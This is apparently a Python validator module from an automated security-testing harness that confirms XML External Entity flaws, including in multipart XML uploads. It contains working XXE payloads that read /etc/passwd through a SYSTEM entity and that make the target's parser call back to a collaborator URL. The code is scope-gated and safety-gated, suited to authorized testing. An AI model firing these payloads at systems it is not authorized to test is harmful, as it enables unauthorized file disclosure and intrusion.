"""
XXE confirmation leg (deterministic, OOB via the in-process collaborator).

The xxe agent can only GUESS that an XML endpoint resolves external entities. This
proves it out-of-band: POST an XML document declaring an external entity that
points at a unique collaborator URL, and watch for the target's XML parser to
fetch it. A callback is proof the parser resolved the external entity -- confirmed
XXE -- independent of whether the entity's content is reflected (blind XXE too).

Fires on xxe findings, or on any endpoint whose captured request body is XML.
Scope-gated; active (validators.active_enabled).

An XML-bearing multipart file part (an .xml/.svg/... upload, a part typed as XML,
or one whose content is an XML document) is an injection point too (oracle gap:
an XML file upload was skipped as "does not take XML"): the same in-band file-read
and out-of-band payloads replace that part's content, while every other part,
the boundary and the multipart Content-Type are kept as captured.
"""
from __future__ import annotations

import re
from urllib.parse import urlsplit

import httpx

import harness.collaborator as _collab
from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult


def _content_type(exchange: HttpExchange) -> str:
    ct = ""
    for k, v in (exchange.request_headers or {}).items():
        if k.lower() == "content-type":
            ct = (v or "")
    return ct


def _looks_xml(exchange: HttpExchange) -> bool:
    ct = _content_type(exchange).lower()
    if ct.startswith("multipart/"):
        return False  # a multipart body is not one XML document; see multipart_xml_part
    body = (exchange.request_body or "").lstrip()
    return "xml" in ct or body.startswith("<?xml") or (body.startswith("<") and ">" in body)


_XML_FILENAME = re.compile(
    r"\.(?:xml|svg|xsd|xsl|xslt|rss|atom|xhtml|plist|gpx|kml|wsdl|xliff|xlf|dtd)$", re.I)
_PART_NAME = re.compile(r'\bfilename="([^"]*)"', re.I)
_PART_TYPE = re.compile(r"^content-type:\s*([^\r\n]+)", re.I | re.M)


def _multipart_parts(exchange: HttpExchange):
    """(boundary, [(head, content), ...]) of a captured multipart/form-data body,
    or None."""
    ct = _content_type(exchange)
    boundary = re.search(r'boundary="?([^";]+)"?', ct, re.I)
    if "multipart/" not in ct.lower() or not boundary:
        return None
    delimiter = "--" + boundary.group(1)
    parts = []
    for piece in (exchange.request_body or "").split(delimiter)[1:]:
        if piece.startswith("--"):
            break  # the closing delimiter
        piece = piece[2:] if piece.startswith("\r\n") else piece.lstrip("\n")
        head, sep, content = piece.partition("\r\n\r\n")
        if not sep:
            continue
        parts.append((head, content[:-2] if content.endswith("\r\n") else content))
    return (boundary.group(1), parts) if parts else None


def multipart_xml_part(exchange: HttpExchange):
    """(boundary, parts, index) of the first XML-bearing part of a multipart
    body -- a file part named or typed as XML, or a part whose content is an XML
    document -- or None."""
    split = _multipart_parts(exchange)
    if split is None:
        return None
    boundary, parts = split
    for index, (head, content) in enumerate(parts):
        name = _PART_NAME.search(head)
        ptype = _PART_TYPE.search(head)
        text = content.lstrip()
        if ((name and _XML_FILENAME.search(name.group(1) or ""))
                or (ptype and "xml" in ptype.group(1).lower())
                or text.startswith("<?xml")
                or (name and text.startswith("<") and text.rstrip().endswith(">"))):
            return boundary, parts, index
    return None


def _part_label(multipart) -> str:
    _, parts, index = multipart
    head = parts[index][0]
    name = re.search(r'\bname="([^"]*)"', head)
    filename = _PART_NAME.search(head)
    label = repr(name.group(1)) if name else f"#{index}"
    return label + (f", file {filename.group(1)!r}" if filename else "")


def _multipart_with(boundary: str, parts, index: int, content: str) -> str:
    out = []
    for i, (head, value) in enumerate(parts):
        out.append(f"--{boundary}\r\n{head}\r\n\r\n{content if i == index else value}\r\n")
    return "".join(out) + f"--{boundary}--\r\n"


def _payload(callback: str) -> str:
    # External general entity fetched over HTTP -> OOB. Kept minimal and inert
    # (no file read, no parameter-entity DTD tricks) -- the callback alone proves
    # external-entity resolution.
    return ('<?xml version="1.0"?>\n'
            f'<!DOCTYPE probe [<!ENTITY xxe SYSTEM "{callback}">]>\n'
            '<probe>&xxe;</probe>')


# In-band file-read proof. /etc/passwd is world-readable and contains no secrets
# (password hashes live in the non-readable /etc/shadow); its `root:...:0:0:`
# line is a strong, stable signature. Reading it is a non-destructive read that
# also demonstrates the lab-class objective ("retrieve files") without touching
# any application state.
_FILE_URI = "file:///etc/passwd"
_PASSWD_SIG = re.compile(r"root:[^:\n]*:0:0:", re.IGNORECASE)
_LEAF_ELEMENT = re.compile(r"(<([A-Za-z_][\w.-]*)\s*>)([^<>]*)(</\2>)")


def _inject_file_entity(body: str, file_uri: str = _FILE_URI) -> str:
    """Turn a captured XML body into a file-reading XXE payload: declare a SYSTEM
    entity for the file and substitute it into the first leaf element's text (the
    value most apps echo back). Falls back to a minimal document when the captured
    body has no usable element."""
    body = (body or "").strip()
    decl = ""
    m = re.match(r"^\s*<\?xml[^>]*\?>", body)
    if m:
        decl = m.group(0)
        rest = body[m.end():].lstrip()
    else:
        rest = body
    root_m = re.search(r"<([A-Za-z_][\w.-]*)", rest)
    root = root_m.group(1) if root_m else "probe"
    doctype = f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{file_uri}">]>'
    if root_m and _LEAF_ELEMENT.search(rest):
        injected = _LEAF_ELEMENT.sub(r"\1&xxe;\4", rest, count=1)
    else:
        rest = f"<{root}>&xxe;</{root}>"
        injected = rest
    head = decl or '<?xml version="1.0"?>'
    return f"{head}\n{doctype}\n{injected}"


class XxeValidator(Validator):
    name = "xxe"
    finding_classes = {"xxe", "xml_external_entity", "xml_external_entities"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 collaborator=None, oob_callbacks_enabled: bool = True):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self._collab = collaborator
        self.oob_callbacks_enabled = bool(oob_callbacks_enabled)

    def collab(self):
        return _collab.resolve(self._collab)

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return (super().applies(finding, exchange) or _looks_xml(exchange)
                or multipart_xml_part(exchange) is not None)

    def claims_class(self, finding: Finding, exchange: HttpExchange | None = None) -> bool:
        """R11-1: applies() also routes by an XML body or XML multipart part; a confirmation proves
        this validator's class only for a finding of that class."""
        return Validator.applies(self, finding, exchange)

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "xxe", summary=why)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        from harness.scope_lock import host_in_scope
        if self.allowed_hosts and not host_in_scope(exchange.url, self.allowed_hosts, active_mode=True):
            return self._skip("target origin is out of scope")
        multipart = None if _looks_xml(exchange) else multipart_xml_part(exchange)
        if multipart is None and not _looks_xml(exchange):
            return self._skip("endpoint does not take XML (no XML body or XML-bearing multipart "
                              "part) -- nothing to inject an external entity into")
        headers = {k: v for k, v in (exchange.request_headers or {}).items()
                   if k.lower() not in ("host", "content-length")}
        headers.setdefault("Content-Type", "application/xml")
        method = (exchange.method or "POST").upper()

        def document(build) -> str:
            """The request body carrying `build(captured XML)`: the whole body, or
            the XML-bearing multipart part with the rest kept as captured."""
            if multipart is None:
                return build(exchange.request_body or "")
            boundary, parts, index = multipart
            return _multipart_with(boundary, parts, index, build(parts[index][1]))
        where = ("" if multipart is None else
                 f" (in the multipart part {_part_label(multipart)})")

        # Bind and validate configuration before even the in-band probe.
        collab = self.collab() if self.oob_callbacks_enabled else None
        # 1) In-band file-read proof first: inject a SYSTEM entity for a
        #    world-readable file and detect its signature reflected in the
        #    response. Definitive, needs no collaborator, and is a read-only PoC.
        try:
            await global_throttle.acquire()
            async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                        follow_redirects=False, verify=False) as client:
                resp = await client.request(
                    method, exchange.url, headers=headers,
                    content=document(_inject_file_entity))
        except SafetyGateBlocked:
            return self._skip("mutating XML replay not authorized (set validators.allow_mutating_replay)")
        except httpx.HTTPError as e:
            return ValidationResult(self.name, "error", "xxe", summary=f"request failed: {e.__class__.__name__}")
        if _PASSWD_SIG.search(resp.text or ""):
            return ValidationResult(
                self.name, "confirmed", "xxe", confidence=0.95, confirmed=True,
                summary="XXE confirmed (in-band): the XML parser resolved a SYSTEM entity and read a "
                        "local file, whose contents were reflected in the response.",
                # Prove the read WITHOUT dumping the file: report only that the
                # /etc/passwd-format signature appeared, never the file body.
                evidence=(f"POSTed an XML document declaring `<!ENTITY xxe SYSTEM \"{_FILE_URI}\">` to "
                          f"{exchange.url}{where}; the response contained a /etc/passwd-format line "
                          f"(matched `root:*:0:0:`), proving external-entity file retrieval. The file "
                          f"contents are redacted here; the read is non-destructive."))

        # 2) Out-of-band proof: catches BLIND XXE (no reflection) via a collaborator.
        if not self.oob_callbacks_enabled:
            return ValidationResult(self.name, "inconclusive", "xxe",
                                    summary="Check incomplete: callback probes disabled by policy")
        collab = self.collab()
        if collab is None:
            return ValidationResult(self.name, "inconclusive", "xxe",
                                    summary="In-band check did not confirm; callback probes disabled by policy")
        token = collab.token()
        try:
            await global_throttle.acquire()
            # The XML POST is a mutating send -> route it through the safety gate
            # (needs the allow_mutating_replay opt-in).
            async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                        follow_redirects=False, verify=False) as client:
                callback = collab.url(token)
                await client.request(method, exchange.url, headers=headers,
                                     content=document(lambda _xml: _payload(callback)))
        except SafetyGateBlocked:
            return self._skip("mutating XML replay not authorized (set validators.allow_mutating_replay)")
        except httpx.HTTPError as e:
            return ValidationResult(self.name, "error", "xxe", summary=f"request failed: {e.__class__.__name__}")
        if await collab.wait_for_hit(token, timeout=self.timeout):
            return ValidationResult(
                self.name, "confirmed", "xxe", confidence=0.95, confirmed=True,
                summary="XXE confirmed: the XML parser resolved an external entity and fetched an "
                        "attacker-controlled URL out-of-band.",
                evidence=f"POSTed an XML document declaring an external entity pointing at a unique "
                         f"collaborator URL to {exchange.url}{where}; the parser called back to it "
                         f"(blind-safe proof).")
        unavailable = _collab.unavailable_result(collab, exchange.url, self.name, "xxe")
        if unavailable is not None:
            return unavailable
        return ValidationResult(
            self.name, "not_confirmed", "xxe", confidence=0.0, confirmed=False,
            summary="No out-of-band callback observed -- external entities appear disabled",
            evidence="The external-entity payload produced no collaborator hit within the window.")
